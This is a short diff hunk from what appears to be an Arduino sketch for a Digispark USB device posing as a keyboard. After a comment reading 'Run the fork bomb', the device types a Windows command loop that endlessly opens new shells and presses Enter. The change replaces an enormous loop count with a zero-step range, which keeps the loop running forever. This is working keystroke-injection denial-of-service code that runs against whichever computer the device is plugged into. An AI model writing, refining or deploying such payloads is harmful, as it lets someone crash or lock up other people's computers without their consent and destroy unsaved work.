@@ -19,7 +19,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //Run the fork bomb
   DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("for /l %x in (1,1,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) do start"));
+  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
     /*Stops the digispark from running the scipt again*/
